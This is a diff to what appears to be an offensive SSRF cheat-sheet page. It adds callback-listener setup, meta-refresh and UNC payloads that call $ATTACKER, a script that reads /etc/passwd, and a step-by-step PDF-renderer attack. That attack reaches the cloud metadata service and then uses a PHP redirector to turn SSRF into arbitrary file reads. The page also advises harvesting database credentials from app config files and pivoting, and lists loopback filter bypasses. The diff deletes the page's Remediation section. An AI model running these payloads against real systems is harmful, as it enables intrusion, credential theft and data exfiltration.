@@ -29,6 +29,64 @@ python3 -m http.server 80
 interactsh-client
 ```
 
+### :material-webhook: Catching the callback
+
+| Listener | Gets you | Costs you |
+| --- | --- | --- |
+| **Burp Collaborator** | DNS + HTTP + SMTP, polled in-tool, per-payload subdomains | Burp **Pro** |
+| **interactsh** | The same, self-hostable, scriptable from the CLI | A binary on the box |
+| **webhook.site** | Full request capture over plain HTTPS, readable from a browser | Third-party — your callback data lands on someone else's server |
+| `python3 -m http.server` | HTTP only, and only if the target can reach you | A routable host |
+
+`webhook.site` is the one to reach for from a locked-down jump box where you
+cannot install anything and do not have Pro. Create the listener and read it
+back entirely over `curl`:
+
+```bash
+# 1. Create the external listener
+UUID=$(curl -s -X POST https://webhook.site/token -d '{}' | jq -r .uuid)
+echo "https://webhook.site/$UUID"
+
+# 2. See the requests made to it
+curl -s "https://webhook.site/token/$UUID/requests?sorting=oldest"
+```
+
+!!! opsec "An OAST host is an exfil host"
+    Everything the target sends — headers, tokens, internal hostnames, sometimes
+    a whole response body — is now sitting on a third party's infrastructure,
+    readable by anyone with the URL. Free `webhook.site` tokens have no
+    authentication at all. Use it for *confirming a callback*, and use
+    Collaborator or your own interactsh for anything carrying client data.
+
+### :material-refresh: Meta-refresh, when you control HTML but not the URL
+
+If the sink renders HTML you supply rather than fetching a URL you supply, a
+meta refresh makes the renderer navigate for you:
+
+```html
+<meta http-equiv="refresh" content="0;url=//$ATTACKER">
+<meta http-equiv="refresh" content="0;url=\\\\$ATTACKER">
+```
+
+The UNC form (`\\host`) is worth trying separately — on Windows-based renderers
+it can trigger an SMB fetch and leak a NetNTLM hash rather than an HTTP request.
+See [Coercion & NTLM Relay](../network/ntlm-relay.md).
+
+Where the sink evaluates JavaScript, the same idea reads local files and returns
+them inline instead of blind:
+
+```html
+<script>
+x = new XMLHttpRequest();
+x.onload = function () { document.write(btoa(this.responseText)); };
+x.open("GET", "file:///etc/passwd");
+x.send();
+</script>
+```
+
+Base64 the response before writing it out — otherwise the rendered document
+mangles it — then decode locally.
+
 ## :material-cloud-lock: The cloud metadata jackpot
 
 <span class="pill pill-hard">#1 payoff</span>
@@ -167,19 +225,109 @@ http://127.0.0.1:2375/   # Docker API -> container escape
     - **CRLF in the URL** (`%0d%0a`) can inject extra headers or smuggle a second
       request into the fetcher.
 
-!!! tip "PDF / screenshot renderers"
-    HTML-to-PDF (wkhtmltopdf, headless Chrome) fetch resources *at render time*.
-    Inject `<iframe src="http://169.254.169.254/...">`, `<img>`, or
-    `<script>fetch('file:///etc/passwd').then(...)</script>` into any field that
-    lands in the generated document — the render engine is your SSRF client, often
-    with `file://` access.
+## :material-file-pdf-box: PDF / HTML renderers → SSRF → LFI
 
-## :material-shield-check: Remediation
+HTML-to-PDF engines (wkhtmltopdf, WeasyPrint, headless Chrome) fetch resources
+**at render time, server-side**. Any field that lands in the generated document
+is an SSRF injection point, and the renderer is your HTTP client.
 
-- Allowlist destinations; resolve + validate the IP **after** DNS (guard against rebinding).
-- Block link-local (`169.254.0.0/16`), loopback, and RFC1918 ranges at the egress.
-- Enforce **IMDSv2** and hop-limit 1 on AWS; require metadata headers everywhere.
-- Don't follow redirects in server-side fetchers.
+**1 — Confirm HTML injection.** Put a tag in an invoice/report/profile field that
+ends up in the PDF:
+
+```html
+"><h1>XSS</h1>
+```
+
+**2 — Confirm outbound fetch.** Scripts are usually blocked (an `XMLHttpRequest`
+to `file://` will fail), so use resource-loading tags instead — they need no JS:
+
+```html
+"><img src="http://$ATTACKER/">
+```
+
+The callback identifies the engine, which tells you which tricks apply:
+
+```text
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
+```
+
+**3 — Reach the metadata service.** Render the response into the PDF itself, so
+even a blind fetcher becomes readable output:
+
+```html
+"><iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">
+```
+
+Swap the tag if `iframe` is filtered — all three render remote content:
+
+```html
+"><embed src="http://169.254.169.254/latest/dynamic/instance-identity/" width="200" height="200" />
+"><object data="http://169.254.169.254/latest/dynamic/instance-identity/" width="400" height="300" type="text/html"></object>
+"><img src='http://169.254.169.254/latest/dynamic/instance-identity/' height="2000" width="800">
+```
+
+**4 — Escalate to arbitrary file read.** Direct `file://` in the payload is
+normally stripped, but the renderer **follows the `Location` header — including a
+cross-scheme redirect**. Host a one-line redirector and let it hand the engine a
+`file://` URL:
+
+```php
+<?php header('location:file://'.$_REQUEST['url']); ?>
+```
+
+```html
+"><iframe height="2000" width="800" src=http://$ATTACKER/test.php?url=%2fetc%2fpasswd></iframe>
+```
+
+The file contents render straight into the PDF you get back.
+
+!!! loot "Go past `/etc/passwd`"
+    Proof-of-concept is `/etc/passwd`; impact is the app's own config. Read
+    framework config for DB credentials — `config/database.yml` (Rails),
+    `.env` (Laravel), `application.properties`, `web.config` — then pivot with
+    what you find. Any cloud creds from step 3 go to [AWS](../cloud/aws.md).
+
+!!! tip "Why this beats a normal SSRF filter"
+    The allowlist only ever sees your *first* URL, which is a plain
+    attacker-hosted HTTP endpoint. The scheme switch happens inside the
+    redirect, after validation — the same reason 3xx redirects defeat
+    allowlists generally.
+
+A worked product example of this exact class is the OutSystems
+[`/HtmlToPdfConverter`](../webtech/outsystems.md) endpoint.
+
+## :material-format-list-checks: More localhost bypasses & tricks
+
+If `127.0.0.1` is blocklisted, these alternate encodings often slip through:
+
+```text
+127.1
+0177.1
+0x7f.1
+127.X.X.X    (any 127.0.0.0/8 address routes to loopback)
+```
+
+**Meta-refresh redirect** — inject a client-side redirect to send a rendering browser (or a fetcher that honours HTML) toward an internal host:
+
+```html
+<meta http-equiv="refresh" content="0;url=//$TARGET">
+```
+
+Some filters block `//` to stop location changes — the browser normalizes `\\` to `//`, so try:
+
+```html
+<meta http-equiv="refresh" content="0;url=\\$TARGET">
+```
+
+The same `\\` normalization applies to `file:\\etc\passwd` when you are already in a `file://` origin.
+
+!!! tip "Headers to try"
+    When the SSRF is header-driven, `X-Forwarded-For` is the first header to fuzz — many apps proxy or trust the value into an internal request.
+
+!!! abstract "Server-side spreadsheet injection"
+    XLS/XLSX/CSV generators and converters evaluate formulas **server-side**, so
+    `=WEBSERVICE("http://169.254.169.254/…")` in a cell is a full SSRF — and DDE
+    takes it to RCE. Full technique → [Spreadsheet / Formula Injection](spreadsheet-injection.md).
 
 ## :material-link-variant: Related
 
